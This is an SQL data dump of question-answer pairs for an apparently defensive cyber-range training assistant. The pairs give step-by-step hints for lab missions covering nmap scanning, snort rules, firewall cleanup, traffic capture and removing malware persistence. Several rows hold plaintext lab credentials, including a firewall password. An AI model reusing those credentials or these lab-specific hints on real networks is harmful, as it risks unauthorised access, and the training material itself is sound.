INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (547, 8, NULL, N'how do I do objective 3?', N'how do i do objective 3', N'Do an nmap stealth scan of the domain controller, which is labeled DC01 on the network map.', N'e', N'751b1db248f34183b14c8826e158fdd6')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (548, 8, NULL, N'how do I do objective 4?', N'how do i do objective 4', N'SSH to the SO-MASTER box (172.16.30.11) and add a snort rule to the /etc/nsm/rules/local.rules file to alert on brute force attacks against Windows shares. You will need to open /etc/nsm/rules/local.rules as an administrator.', N'e', N'8afa9b3d1d89411e8844dc7318f5b896')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (549, 8, NULL, N'how do I do objective 5?', N'how do i do objective 5', N'From the Kali box, rdesktop to the ADFS01 box. Preface your username with the domain name centurostar. Once you rdesktop to the ADFS01 box, start the command prompt as an administrator and install evtsys in the c:\software directory, then start the evtsys service, and configure your SAM audit policy by getting the object policy category object access, and enabling success and failure alerts.', N'e', N'62f275ce122744bf805d21282d4782e0')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (550, 8, NULL, N'how do I do objective 6?', N'how do i do objective 6', N'SSH to the SO-MASTER box (172.16.30.11) and add a snort rule to the /etc/nsm/rules/local.rules file to detect beacons going out of the network to the adversary. In this rule you need to use the alert action, use the tcp protocol, and set a threshold for messages with the S flag.', N'e', N'9b77497467644d55bab5a9a466e497af')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (551, 8, NULL, N'how do I do objective 7?', N'how do i do objective 7', N'There is a suspicious process running on two of the boxes in the Server Network. On each of those boxes, find and kill the process and delete the process source code. You also need to find and delete a phony service on those boxes.', N'e', N'77781959fd944fe387a877ceb65d5dd0')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (552, 8, NULL, N'what are my credentials?', N'what are my credentials', N'Supplied usernames and passwords will follow the format - username: user<#>, password: P@ssedU<#> (where <#> is the user number appearing in your command line prompt on the first terminal you''re given). For greenbone, you will need the password that appears toward the end of the output of the openvas-setup command, and should use the username admin.', N'e', N'33313ce1c45c48839a0b3143773a4ff7')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (553, 8, NULL, N'how to identify vulnerabilities within the server network using openvas?', N'how to identify vulnerabilities within the server network using openvas', N'You can identify vulnerabilities using OpenVAS. You can access the OpenVAS greenbone user interface by navigating to https://localhost:9392 and logging in with the username admin and the password generated by the openvas-setup command. From greenbone you can scan machines and subnets on your network for common vulnerabilities. An easy way to do this is by supplying the IP address of the machine or subnet to the Quick Start scan box.', N'e', N'a5a620a8fa5b49998bc7b6bcac93e039')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (554, 8, NULL, N'how do I use greenbone?', N'how do i use greenbone', N'You can access the OpenVAS greenbone user interface by navigating to https://localhost:9392 and logging in with the username admin and the password generated by the openvas-setup command. From greenbone you can scan machines and subnets on your network for common vulnerabilities. An easy way to do this is by supplying the IP address of the machine or subnet to the Quick Start scan box.', N'e', N'77ca7de25c3b4343974b8c451a47d8d5')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (555, 8, NULL, N'how do i use port scanning to identify a vulnerable service on the domain controller?', N'how do i use port scanning to identify a vulnerable service on the domain controller', N'You need to run an nmap stealth scan on the Domain Controller, which is labeled DC01 on the network map. The nmap flag for a stealth scan is -sS, and this scan should be run as root.', N'e', N'a4763fd0a9f74f32b37aabe1f5bce293')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (556, 8, NULL, N'how do I use snort?', N'how do i use snort', N'You can write snort rules on the Security Onion box in the file /etc/nsm/rules/local.rules. Generally, each rule is separated in two logical sections, the header and the options. More info about writing snort rules is available in your references.', N'e', N'5435912b57504ea198d6753532b3c2b8')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (557, 10, NULL, N'how do I gather credentials?', N'how do i gather credentials', N'You should not need to find a password for this mission.', N'e', N'3ba818897cf74d4585ec28d3fdd8d577')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (558, 10, NULL, N'what tools should I use for this mission?', N'what tools should i use for this mission', N'For this mission you will need to use SGUIL to monitor network traffic. You will need to use ssh to move around on the network, and you will need a script located on the Kali box called submit to submit your answer for objective 2. You will also need to use VyOS commands to interact with the firewall rule sets located on the VyOS router.', N'e', N'ecd26888a1ce42bd92f56ce9b1836b3d')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (559, 10, NULL, N'what are my credentials?', N'what are my credentials', N'Supplied usernames and passwords will follow the format - username: user<#>, password: P@ssedU<#>. For the PLCs you should use - username: user<#>, password: P@ssedU<#>. In all previously mentioned usernames and passwords <#> is the user number appearing in your command line prompt on the first terminal you''re given. You have access to the firewalls and routers with - username: vyos, password: U52C$soXP*xe', N'e', N'22d113df18484565bb15cd020db7d1eb')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (560, 10, NULL, N'how do I find the PLC ip addresses?', N'how do i find the plc ip addresses', N'You were given the IP addresses of the PLCs in the mission orders on the execution tab. You can also find them with nmap.', N'e', N'090530ac03854889b2353fe378a9cfa9')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (561, 10, NULL, N'how do I do objective 1?', N'how do i do objective 1', N'Use your client1 credentials to login to the network monitoring tool SGUIL and verify the tool is monitoring traffic on your network.', N'e', N'd6e2f608a9a94d809334d7b8421a1fdb')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (562, 10, NULL, N'how do I do objective 2?', N'how do i do objective 2', N'There are multiple ways to identify the adversary''s IP address, for instance you can look for suspicious activity in SGUIL. Once you''ve identified the malicious IP address, login to the Kali box and submit the answer using the submit script, e.g. submit --answer malicious_IP', N'e', N'd8a9d6ae37ee4930b4c9b90e66fb93c7')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (563, 10, NULL, N'how do I do objective 3?', N'how do i do objective 3', N'Check Firewall1 to make sure there are no bad firewall rules in place. If there is a bad firewall rule, disable or delete it.', N'e', N'cd70ef5ffc1e4babbafc040967ed98ec')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (564, 10, NULL, N'how do I view the firewall rules?', N'how do i view the firewall rules', N'You can login to the firewall with ssh. Use the username vyos, the IP address 172.16.0.1, and the password U52C$soXP*xe. On the firewall you can enter conf at your terminal to enter configuration mode. Then you can enter the following to view the firewall rules: show firewall. Use the arrow keys to scroll up and down and view the firewall rules, and press q (or scroll all the way to the bottom) to quit viewing the rules.', N'e', N'a29108e2d2184efcbb29dba659ce7f9e')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (565, 10, NULL, N'how do I delete a firewall rule?', N'how do i delete a firewall rule', N'If you are logged into the firewall in configuration mode you can delete a firewall rule using the following command and substituting in the appropriate values for the <ruleset name> and the <rule number>: del firewall name <ruleset name> rule <rule number>. Make sure you commit and save your changes by entering the commit command followed by the save command.', N'e', N'41e074f296c848588fc76295d26a81d7')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (566, 10, NULL, N'how do I do objective 4?', N'how do i do objective 4', N'Once you have completed Objective 3, you can reboot the PLCs to restore services. Once the devices reboot, the services will resume normal operations. You cannot complete this objective until objective 3 is complete.', N'e', N'c5433acd9895439bb3a609345d6c3e81')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (567, 10, NULL, N'how do I reboot the PLCs?', N'how do i reboot the plcs', N'If you''re logged into the PLC, you can reboot the box with the following command: sudo init 6.', N'e', N'4f6eceffdc9a4f99b788e8a88cb1d91a')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (568, 16, NULL, N'what tools should I use?', N'what tools should i use', N'For this mission you will need to use ssh to move around your network. You will also need tcpdump to capture network traffic, scp to move files around on the network, and wireshark to analyze your captured network traffic. When you locate the infection you can use a number of tools to eradicate it, including but not limited to the kill command to kill processes, the rm command to remove files, and the netstat command to examine network activity on a particular machine.', N'e', N'ccf9bee44e464f38a60d5f33e314b5a2')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (569, 16, NULL, N'how do I gather credentials?', N'how do i gather credentials', N'You should not need to find a password for this mission.', N'e', N'2872eb4916784da8a6865be8b4f5f27d')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (570, 16, NULL, N'what are my credentials?', N'what are my credentials', N'Supplied usernames and passwords will follow the format - username: user<#>, password: P@ssedU<#> (where <#> is the user number appearing in your command line prompt on the first terminal you''re given)', N'e', N'82b9ed4195d7412ba5cf12bf8f897dd1')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (571, 16, NULL, N'how do I find the C2 server?', N'how do i find the c2 server', N'This is primarily a defensive mission, and finding/attacking a C2 server is not one of your objectives.', N'e', N'3b96e01f834b460290cd034770585336')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (572, 16, NULL, N'how do I find the client1 IP address?', N'how do i find the client1 ip address', N'You can find the IP address of your client1 box with the ifconfig command line tool. View the manpage for more information.', N'e', N'81ae2e55284744188f3c08428ae620d3')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (573, 16, NULL, N'how do I find the DNS IP address?', N'how do i find the dns ip address', N'You can pass the IP address of the client1 box to the nslookup command to find the DNS server''s IP.', N'e', N'48594e0987cb4179b13f20643ef44cf7')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (574, 16, NULL, N'how do I find the router IP address?', N'how do i find the router ip address', N'Use the command ''ip route'' to view the routing table and find the default router''s IP address.', N'e', N'9f19ab054ecc4984959950723526c542')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (575, 16, NULL, N'how do I find the firewall IP address?', N'how do i find the firewall ip address', N'You need to login to the firewall and run the ifconfig command.', N'e', N'a1698864b58d40b38531b604e6c7024b')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (576, 16, NULL, N'how do I do objective 1?', N'how do i do objective 1', N'This objective has three main steps. Step 1: login to the firewall. Step 2: use tcpdump to capture network traffic and write the output to a file (the objective will be awarded when you capture traffic, but continue to the next step!) Step 3: use scp to send the file back to your client1 box so you can analyze the traffic in wireshark.', N'e', N'1f585c49fa4e41baa12aaf38dc6173b0')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (577, 16, 1, N'how do I do step 1?', N'how do i do step 1', N'You can use your credentials to ssh to the firewall, which has the IP address 192.168.0.10.', N'e', N'e3364de34910475d8a609eea363b760d')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (578, 16, 1, N'how do I do step 2?', N'how do i do step 2', N'You will need to run the tcpdump command with sudo. Capture traffic from all available interfaces on the 192.168.0.0/16 network and write the output to a file with the -w flag. I also suggest disabling address resolution with the -n flag. You can view the man page for more information.', N'e', N'7ebe594416974b05aeded6df18257dd7')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (579, 16, 1, N'how do I do step 3?', N'how do i do step 3', N'Assuming you''re user number is 1 and you called your output file out.pcap, you can scp the file from the firewall back to your client1 machine with the command: scp out.pcap user1@192.168.0.11:/home/user1/', N'e', N'42fd48fdd2874370af772804624fd83d')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (580, 16, NULL, N'how do I do objective 2?', N'how do i do objective 2', N'Step 1: analyze network traffic to find a machine on your network that has been infected with malware. Step 2: login to that machine and find any malicious process(es) present, then view the process properties to find the source code, and then kill the process', N'e', N'3fcc643c17174aa387a7f2deece9612a')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (581, 16, 2, N'how do I do step 1?', N'how do i do step 1', N'To find the infected machine you should inspect the traffic you captured with tcpdump from the firewall. You should have written the output to a pcap file with the -w flag and transferred the file to your client1 machine from the firewall with scp. On the client1 machine open the file with wireshark and examine the traffic for unusually long lasting or unusually large conversations. You may find the IPv4 information (accessible through the Statistics menu) particularly useful.', N'e', N'd95fbf5e549045debe9693d59e1c3d0c')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (582, 16, 2, N'how do I do step 2?', N'how do i do step 2', N'When you find the infected machine you can login to it via ssh with your credentials. Once you''re on the infected machine, you can use netstat  with the -p flag to monitor for any processes making suspicious network connections - note that the PID is listed by netstat next to the connection state. When you identify the malicious process you can find more information (such as the source code location) with following command where <PID> is the process ID: ps -f <PID>. When you''ve noted the name of the malicious executable, stop the process using the following command where <PID> is the process ID: sudo kill -9 <PID>', N'e', N'5c57d58e64cd47fbb1b0afb464899f36')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (583, 16, NULL, N'what is suspicious about the process?', N'what is suspicious about the process', N'The process communicates with an external IP address you might recognize from the suspiciously large connection in your traffic capture. You can use this command to look for connections to the malicious IP address in the ESTABLISHED state: sudo netstat -a -p |grep 44.255. The process communicates intermittently, so you may need to run this command numerous times. When you find a malicious connection, note the number listed to the right of the connection state. This is the Process ID (PID) of the malicious process.', N'e', N'af692016b7e347bd8eea2b99c080384a')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (584, 16, NULL, N'how do I do objective 3?', N'how do i do objective 3', N'Track down and remove all artifacts of the infection. Step 1: find and remove any malicious source code. Step 2: remove any persistence mechanisms. Step 3: kill any malicious processes that may have been restarted before you eliminated the persistence mechanisms.', N'e', N'1f576594bb15418d85f2ccdd00f82e7e')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (585, 16, NULL, N'what is suspicious about the network traffic?', N'what is suspicious about the network traffic', N'Consistent and/or prolonged connections, transfers with abnormally large conversation sizes, or oddly-named url''s (such as www.45df987ysdf.com) might be considered suspicious.', N'e', N'a45db3482075483ebba0ca98c61588b1')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (586, 16, NULL, N'how do i find the exfil directory?', N'how do i find the exfil directory', N'First you need to find a malicious process on the system, then track down the source code of that process. Finally view the source code in a text editor. There is a reference in the source code to the exfil directory.', N'e', N'c7300048eef8453db043f280e995efab')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (587, 16, 3, N'how do I do step 1?', N'how do i do step 1', N'You should have noted the name of the first piece of malicious source code in the previous objective by examining the details of a malicious process. Find the code with the find command. Before removing that code you should view the code and inspect it for signs of other malicious artifacts. There is another malicious file, and a directory of data being exfiltrated which both need to be removed. You can remove the artifacts using the command: sudo rm <name>. You will need to include the -r flag to remove the directory.', N'e', N'8290a752f5c644808aeb8b50e1ed7b9c')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (588, 16, 3, N'how do I do step 2?', N'how do i do step 2', N'A common persistence mechanism on Linux machines is the cronjob. You can interact with cronjobs through the crontab command. To list the cronjobs of a particular user''s account, use the command: sudo crontab -u <username> -l. You can remove the cronjobs by using -r instead of -l.', N'e', N'a5cae81de1d241e18ae5870eebcf97b5')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (589, 16, 3, N'how do I do step 3?', N'how do i do step 3', N'You can examine running processes with the ps command and pipe the output to grep to search for the name of the malware process. If there is output, a malicious process was restarted. Kill the process with the following command where <PID> is the process ID: sudo kill -9 <PID>', N'e', N'a08e28cab0974730ae90e562c288b651')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (590, 16, NULL, N'how do I do objective 4?', N'how do i do objective 4', N'To earn this objective you need to ensure that all persistence mechanisms have been removed and no malicious processes were restarted by those mechanisms prior to their removal.', N'e', N'96ac11ad7539491a8f669eb49f81f0a7')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (591, 16, NULL, N'what tools should I use?', N'what tools should i use', N'For this mission you will need to use SGUIL to monitor network activity. In order to track down the infection, you will also likely need to use ELSA or ssh to the Security Onion box to examine Bro logs directly. When you find an infection you should use Rdesktop to login to the compromised machine, then use the sysinternals tools Procexp and TCPView to track down and eradicate the infection.', N'm', N'2d89cb1057354db9b36b1a28cd77243c')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (592, 16, NULL, N'how do I gather credentials?', N'how do i gather credentials', N'You should not need to find a password for this mission.', N'm', N'eaa57bf09e504727aaf76e539ce2c0c5')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (593, 16, NULL, N'what are my credentials?', N'what are my credentials', N'Supplied usernames and passwords will follow the format - username: user<#>, password: P@ssedU<#> (where <#> is the user number appearing in your command line prompt on the first terminal you''re given)', N'm', N'ddbd88c1f81e449e8d1c91246614f7cb')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (594, 16, NULL, N'what are my network monitoring tools?', N'what are my network monitoring tools', N'Your most important network monitoring tools are SGUIL and ELSA.', N'm', N'b2b7ee40390e4fd48fa666cc4dd9d016')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (595, 16, NULL, N'how do I find the C2 server?', N'how do i find the c2 server', N'This is primarily a defensive mission, and finding/attacking a C2 server is not one of your objectives.', N'm', N'1565d1b97935434b8cbe0079fe4a646a')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (596, 16, NULL, N'how do I find the DNS IP address?', N'how do i find the dns ip address', N'You can pass the IP address of the client1 box to the nslookup command to find the DNS server''s IP.', N'm', N'3bfe5c0d16164644afbf07c523b265f3')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (597, 16, NULL, N'how do I find the router IP address?', N'how do i find the router ip address', N'To find the IP addresses of the other machines in the "sec ops" portion of the network diagram as well as the Router, run the following command with the password P@ssedU<#> where <#> is your user number. The Security Onion machine will have SSH and HTTPS services running, while the client1 machine will have ssh, https, and several more services running. The remaining IP addresses belong to the Router. When you have found the remaining 3 Router IP addresses, you can kill the command with Ctrl+c: sudo nmap 172.16.10,20,30.0-255 -sS -ttl 1', N'm', N'9eaa565e22ec4f9884e5eb445bc76739')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (598, 16, NULL, N'what is suspicious about the network traffic?', N'what is suspicious about the network traffic', N'Consistent and/or prolonged connections, transfers with abnormally large conversation sizes, or oddly-named url''s (such as www.45df987ysdf.com) might be considered suspicious.', N'm', N'05f5eced956f4d66be2d45e1a830c329')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (599, 16, NULL, N'how do I do objective 1?', N'how do i do objective 1', N'Use your client1 credentials to login to the network monitoring tool SGUIL and verify the tool is monitoring traffic on your network. You will need to change the Sguild host in the login dialog box to 172.16.30.11.', N'm', N'52b8e05c255a4bf995d5a618eb999747')
